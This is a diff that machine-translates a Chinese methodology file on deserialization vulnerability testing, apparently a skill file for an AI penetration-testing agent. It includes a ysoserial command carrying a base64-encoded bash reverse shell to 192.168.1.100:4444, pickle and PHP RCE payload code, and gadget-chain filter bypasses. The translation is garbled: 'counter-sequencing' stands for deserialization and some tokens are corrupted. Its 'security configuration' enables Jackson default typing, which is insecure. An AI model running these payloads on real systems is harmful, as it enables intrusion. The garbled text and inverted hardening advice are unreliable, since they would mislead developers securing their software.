@@ -1,25 +1,25 @@
 ---
 name: deserialization-testing
-description: 反序列化漏洞测试的专业技能和方法论
+Professional skills and methodology for anti-sequential vulnerability testing
 version: 1.0.0
 ---
 
-# 反序列化漏洞测试
+# Counter-Sequencial Gap Test
 
-## 概述
+## Overview
 
-反序列化漏洞是一种利用应用程序反序列化不可信数据导致的漏洞，可能导致远程代码执行、拒绝服务等。本技能提供反序列化漏洞的检测、利用和防护方法。
+This skill provides detection, use, and protection against anti-sequentization holes.
 
-## 漏洞原理
+## Vulnerability Principle
 
-应用程序将序列化的数据反序列化为对象时，如果数据来源不可信，攻击者可以构造恶意序列化数据，在反序列化过程中执行任意代码。
+When the application converts the data counter-sequence of the sequenced data to the object, if the source of the data is not credible, the attacker can construct maliciously sequenced data and execute any code in the countersequencing process.
 
-## 常见格式
+## Common Format
 
 ### Java
 
-**常见库：**
-- Java原生序列化
+**Common library:**
+- JavaNative Serialisation
 - Jackson
 - Fastjson
 - XStream
@@ -27,72 +27,72 @@ version: 1.0.0
 
 ### PHP
 
-**常见函数：**
+**Common function:**
 - unserialize()
 - json_decode()
 
 ### Python
 
-**常见模块：**
+**Common module:**
 - pickle
 - yaml
 - json
 
 ### .NET
 
-**常见类：**
+**Common Category:**
 - BinaryFormatter
 - SoapFormatter
 - DataContractSerializer
 
-## 测试方法
+## Test Method
 
-### 1. 识别序列化数据
+### 1. Identify Serial Data
 
-**Java序列化特征：**
+**Java serialization characteristic:**
 ```
-AC ED 00 05 (十六进制)
+AC ED 00 05 (Hexadecimal)
 rO0 (Base64)
 ```
 
-**PHP序列化特征：**
+**PHP serialization characteristic:**
 ```
 O:8:"stdClass"
 a:2:{s:4:"test";s:4:"data";}
 ```
 
-**Python pickle特征：**
+**zzzz pickle characteristic:**
 ```
 \x80\x03
 ```
 
-### 2. 检测反序列化点
+### 2. Detection of counter-sequencing points
 
-**常见位置：**
-- Cookie值
-- Session数据
-- API参数
-- 文件上传
-- 缓存数据
-- 消息队列
+**Common locations:**
+- Cookie value
+- SessionData
+- APIParameter
+- File Upload
+- Cache Data
+- Message Queue
 
-### 3. Java反序列化
+### 3. JavaReverse Sequencing
 
-**Apache Commons Collections利用：**
+**Apache Commons Operations uses:**
 ```java
-// 使用ysoserial生成Payload
+// UsingysoserialGeneratePayload
 java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
 ```
 
-**常见Gadget链：**
+**Common Gadget chain:**
 - CommonsCollections1-7
 - Spring1-2
 - ROME
 - Jdk7u21
 
-### 4. PHP反序列化
+### 4. PHPReverse Sequencing
 
-**基础测试：**
+**Base test:**
 ```php
 <?php
 class Test {
@@ -106,7 +106,7 @@ echo serialize(new Test());
 ?>
 ```
 
-**魔术方法利用：**
+**Use of magic methods:**
 - __destruct()
 - __wakeup()
 - __toString()
@@ -114,7 +114,7 @@ echo serialize(new Test());
 
 ### 5. Python pickle
 
-**基础测试：**
+**Base test:**
 ```python
 import pickle
 import os
@@ -126,28 +126,28 @@ class RCE:
 pickle.dumps(RCE())
 ```
 
-## 利用技术
+## Exploitation Techniques
 
 ### Java RCE
 
-**使用ysoserial：**
+**Use ysoserial:**
 ```bash
-# 生成Payload
+# GeneratePayload
 java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" > payload.bin
 
-# Base64编码
+# Base64Encoded
 base64 -w 0 payload.bin
 ```
 
-**手动构造：**
+**Manually constructed:**
 ```java
-// 使用Gadget链构造恶意对象
-// 参考ysoserial源码
+// UsingGadgetThe chain's a malicious object.
+// ReferencesysoserialSource
 ```
 
 ### PHP RCE
 
-**利用POP链：**
+**Using POP chains:**
 ```php
 <?php
 class A {
@@ -173,7 +173,7 @@ echo serialize($a);
 
 ### Python RCE
 
-**Pickle RCE：**
+**Pickle RCE:**
 ```python
 import pickle
 import base64
@@ -187,125 +187,125 @@ payload = pickle.dumps(RCE())
 print(base64.b64encode(payload))
 ```
 
-## 绕过技术
+## Bypass Techniques
 
-### 编码绕过
+### Encoding Bypass
 
-**Base64编码：**
+**Base64 encoding:**
 ```
-原始: rO0ABXNy...
-编码: ck8wQUJYTnk...
+Original: rO0ABXNy...
+Encoded: ck8wQUJYTnk...
 ```
 
-**URL编码：**
+**URL encoding:**
 ```
 %72%4F%00%AB...
 ```
 
-### 过滤器绕过
+### Filter bypassed
 
-**使用不同Gadget链：**
-- 如果CommonsCollections被过滤，尝试Spring
-- 如果某个版本被过滤，尝试其他版本
+**Using different Gadget chains:**
+- If CommonsCollects are filtered, try Spring
+- Try another version if one version is filtered
 
-### 类名混淆
+### Synchronising folder
 
-**使用反射：**
+**Use of reflection:**
 ```java
 Class.forName("java.lang.Runtime").getMethod("exec", String.class)
 ```
 
-## 工具使用
+## Using the Tools
 
 ### ysoserial
 
 ```bash
-# 列出可用Gadget
+# List availableGadget
 java -jar ysoserial.jar
 
-# 生成Payload
+# GeneratePayload
 java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
 
-# 生成Base64
+# GenerateBase64
 java -jar ysoserial.jar CommonsCollections1 "command" | base64
 ```
 
 ### PHPGGC
 
 ```bash
-# 列出可用Gadget
+# List availableGadget
 ./phpggc -l
 
-# 生成Payload
+# GeneratePayload
 ./phpggc Monolog/RCE1 system id
 
-# 生成编码Payload
+# Generate EncodingPayload
 ./phpggc -b Monolog/RCE1 system id
 ```
 
 ### Burp Suite
 
-1. 拦截包含序列化数据的请求
-2. 使用插件生成Payload
-3. 替换原始数据
-4. 观察响应
+1. Interception of requests containing sequenced data
+2. Use plugins to generatePayload
+3. Replace raw data
+4. Observe the Response
 
-## 验证和报告
+## Verification and Reporting
 
-### 验证步骤
+### Verification Steps
 
-1. 确认可以控制序列化数据
-2. 验证反序列化触发代码执行
-3. 评估影响（RCE、数据泄露等）
-4. 记录完整的POC
-5. 通过 `report_finding` 工具将确认的漏洞录入平台（本平台记录漏洞的唯一入口），字段涵盖位置、类型、严重度、复现步骤/PoC 与修复建议
+1. Confirm that you can control the sequenced data.
+2. Verify counter-sequencing trigger execution
+3. Assess the impact (zzozz, data leak, etc.)
+4. Record the completePOC
+5. Enter identified vulnerabilities into the platform (the only entry to the Platform 's recorded vulnerabilities) through the `report_finding` tool, with fields covering location, type, severity, recovery steps/PoC and recommendations for restoration
 
-### 报告要点
+### Reporting Checklist
 
-- 漏洞位置和序列化数据格式
-- 使用的Gadget链或利用方式
-- 完整的利用步骤和PoC
-- 修复建议（输入验证、使用安全序列化等）
+- Leak position and sequenced data formats
+- Gadget chain or use method used
+- the complete exploitation steps andPoC
+- Remediation recommendations (entry validation, use of secure sequencing, etc.)
 
-## 防护措施
+## Preventive Measures
 
-### 推荐方案
+### Recommended Approach
 
-1. **避免反序列化不可信数据**
-   - 使用JSON替代
-   - 使用安全的序列化格式
+1. **Avoid counter-sequenced untrustworthy data**
+   - Replace with JSON
+   - Use secure sequence formatting
 
-2. **输入验证**
+2. **Input Validation**
    ```java
-   // 白名单验证类名
-   private static final Set<String> ALLOWED_CLASSES = 
+   // White List authentication class name
+   private static final Set<String> ALLOWED_CLASSES =
        Set.of("com.example.SafeClass");
-   
+
    private Object readObject(ObjectInputStream ois) {
-       // 验证类名
+       // Verify the permission
        // ...
    }
    ```
 
-3. **使用安全配置**
+3. **Use security configuration**
    ```java
-   // Jackson配置
+   // JacksonConfigure
    objectMapper.enableDefaultTyping();
-   objectMapper.setVisibility(PropertyAccessor.FIELD, 
+   objectMapper.setVisibility(PropertyAccessor.FIELD,
        JsonAutoDetect.Visibility.ANY);
    ```
 
-4. **类加载器隔离**
-   - 使用自定义ClassLoader
-   - 限制可加载的类
+4. **Class loader quarantine**
+   - Use customClassLoader
+   - Limit Loadable Classes
 
-5. **监控和日志**
-   - 记录反序列化操作
-   - 监控异常行为
+5. **Monitoring and Log**
+   - Record counter-sequencing operations
+   - Surveillance of anomalies
 
-## 注意事项
+## Important Notes
 
-- 仅在授权测试环境中进行
-- 注意不同版本库的Gadget链差异
-- 测试时注意Payload大小限制
-- 了解目标应用的依赖库版本
+- Perform only in an authorized testing environment
+- Pay attention to the Gadget chain differences in different versions of the library
+- Payload size limit during testing
+- Reliance library version for understanding target applications
